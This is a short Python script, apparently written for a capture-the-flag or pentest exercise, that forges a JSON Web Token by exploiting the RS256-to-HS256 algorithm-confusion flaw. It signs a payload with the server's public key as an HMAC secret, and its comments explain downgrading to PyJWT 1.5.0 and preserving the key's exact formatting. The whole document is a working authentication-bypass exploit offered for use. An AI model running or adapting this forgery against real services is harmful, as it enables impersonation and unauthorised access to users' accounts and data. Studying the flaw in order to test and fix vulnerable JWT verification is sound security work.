#! usr/bin/env python3

#
# Purpose of the script is to forge token JWT
# we gonna exploit a vuln wich let change the algorithm RS256 to HS256
# 
# you need to downgrade your version of Pyjwt --> take the 1.5.0 
# and downgrade your python version too (3.10.0) have issue with the downgrade of Pyjwt
#


import jwt

def main():

    payload_data = {
		"some":"payload"
	}
    
    # we need to pass here the public key
    # she have to match exactly the private key on the server
    # so we need to input here the public key with the full formatting (we need to keep the : \n etc )
    public_key = b"<your_public_key>"

    my_super_token = jwt.encode(payload_data,public_key,algorithm ='HS256')
    print(my_super_token)


if __name__ == '__main__':
        main()

    